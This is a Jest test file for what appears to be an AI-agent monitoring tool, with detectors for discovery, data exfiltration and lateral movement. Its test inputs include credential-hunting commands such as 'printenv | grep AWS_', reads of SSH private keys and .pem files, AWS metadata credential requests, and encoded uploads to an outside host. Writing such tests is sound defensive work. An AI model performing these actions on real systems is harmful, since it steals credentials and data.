import { DetectorContext } from '@agentguard/core-schema';
import { DiscoveryDetector } from '../detectors/built-in/discovery-detector';
import { ExfilDetector } from '../detectors/built-in/exfil-detector';
import { LateralMovementDetector } from '../detectors/built-in/lateral-movement-detector';

const ctx = (toolName: string, args: any = {}): DetectorContext => ({
  tool: { name: toolName, args },
  agent: { id: 'a-1' },
  tenant: { id: 'default' },
});

// ── Discovery ─────────────────────────────────────────────────────────────

describe('DiscoveryDetector', () => {
  const d = new DiscoveryDetector();

  it('quiet on a benign tool call', () => {
    expect(d.evaluate(ctx('web_search', { q: 'weather' }))).toEqual([]);
  });

  it('T7001: tool name like get_env emits env enumeration signal', () => {
    const s = d.evaluate(ctx('get_env', {}));
    expect(s[0]?.ontology).toContain('AAT-T7001');
  });

  it('T7001: content like printenv inside a shell tool emits env enumeration', () => {
    const s = d.evaluate(ctx('shell_exec', { cmd: 'printenv | grep AWS_' }));
    expect(s.find(x => x.ontology?.includes('AAT-T7001'))).toBeDefined();
  });

  it('T7002: read_file targeting ~/.ssh/id_rsa is critical', () => {
    const s = d.evaluate(ctx('read_file', { path: '/home/x/.ssh/id_rsa' }));
    const cred = s.find(x => x.ontology?.includes('AAT-T7002'));
    expect(cred?.severity).toBe('critical');
  });

  it('T7002: glob hitting *.pem flags credential discovery', () => {
    const s = d.evaluate(ctx('find_files', { pattern: '/etc/**/*.pem' }));
    expect(s.find(x => x.ontology?.includes('AAT-T7002'))).toBeDefined();
  });

  it('T7003: outbound HTTP to AWS IMDS metadata is critical', () => {
    const s = d.evaluate(ctx('http_get', { url: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/' }));
    const topo = s.find(x => x.ontology?.includes('AAT-T7003'));
    expect(topo?.severity).toBe('critical');
  });

  it('T7003: nmap-style tool emits warn signal', () => {
    const s = d.evaluate(ctx('nmap', { target: 'public.com' }));
    expect(s.find(x => x.ontology?.includes('AAT-T7003'))).toBeDefined();
  });

  it('coverage declares 7001/7002/7003', () => {
    expect([...d.coverage].sort()).toEqual(['AAT-T7001', 'AAT-T7002', 'AAT-T7003']);
  });
});

// ── Exfil ─────────────────────────────────────────────────────────────────

describe('ExfilDetector', () => {
  const d = new ExfilDetector();

  it('quiet on non-outbound tools', () => {
    expect(d.evaluate(ctx('read_file', { path: '/tmp/x.txt' }))).toEqual([]);
  });

  it('T5004: 60KB outbound payload emits warn', () => {
    const big = 'x'.repeat(60 * 1024);
    const s = d.evaluate(ctx('http_post', { body: big, url: 'https://x.com' }));
    const lp = s.find(x => x.ontology?.includes('AAT-T5004'));
    expect(lp?.severity).toBe('warn');
  });

  it('T5005: high-entropy base64 blob is critical', () => {
    // Generate a high-entropy base64-shaped string.
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
    let b64 = '';
    for (let i = 0; i < 5000; i++) b64 += chars[Math.floor(Math.random() * chars.length)];
    const s = d.evaluate(ctx('upload', { body: b64, url: 'https://drop.example.com' }));
    const enc = s.find(x => x.ontology?.includes('AAT-T5005'));
    expect(enc?.severity).toBe('critical');
  });

  it('T5003: external URL but no large payload → info', () => {
    const s = d.evaluate(ctx('http_get', { url: 'https://api.public.com/things', q: 'hi' }));
    const ext = s.find(x => x.ontology?.includes('AAT-T5003'));
    expect(ext?.severity).toBe('info');
  });

  it('skips T5003 when target is localhost', () => {
    const s = d.evaluate(ctx('http_get', { url: 'http://localhost:8080/x' }));
    expect(s.find(x => x.ontology?.includes('AAT-T5003'))).toBeUndefined();
  });

  it('coverage declares 5003/5004/5005', () => {
    expect([...d.coverage].sort()).toEqual(['AAT-T5003', 'AAT-T5004', 'AAT-T5005']);
  });
});

// ── Lateral Movement ─────────────────────────────────────────────────────

describe('LateralMovementDetector', () => {
  const d = new LateralMovementDetector();

  it('quiet on tools with no token-shaped args', () => {
    expect(d.evaluate(ctx('send_email', { to: 'a@b.com', body: 'hi' }))).toEqual([]);
  });

  it('flags arg key called "authorization"', () => {
    const s = d.evaluate(ctx('http_post', { url: 'https://x.com', authorization: 'Bearer abcdef1234567890XYZ' }));
    expect(s[0]?.ontology).toContain('AAT-T10002');
    expect((s[0]?.evidence as any).arg_key).toBe('authorization');
  });

  it('flags JWT-shaped string anywhere', () => {
    const jwt = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.signature123ABC';
    const s = d.evaluate(ctx('webhook', { payload: { token: jwt } }));
    expect(s[0]?.ontology).toContain('AAT-T10002');
    expect((s[0]?.evidence as any).token_shape).toBe('jwt');
  });

  it('flags "Bearer …" pattern in any string', () => {
    const s = d.evaluate(ctx('http_post', { headers: 'Authorization: Bearer abc123def456ghi789xyz' }));
    expect(s[0]?.ontology).toContain('AAT-T10002');
  });

  it('deduplicates findings on the SAME key + shape', () => {
    const jwt = 'eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1c2VyIn0.signature123ABC';
    const s = d.evaluate(ctx('webhook', {
      // Same arg path "headers.token" twice with same shape → dedup to 1.
      headers: { token: jwt, also: { token: jwt } },
    }));
    // Both inner objects expose key=token + shape=jwt — same dedup key.
    expect(s.length).toBe(1);
  });

  it('coverage declares 10002', () => {
    expect([...d.coverage]).toEqual(['AAT-T10002']);
  });
});
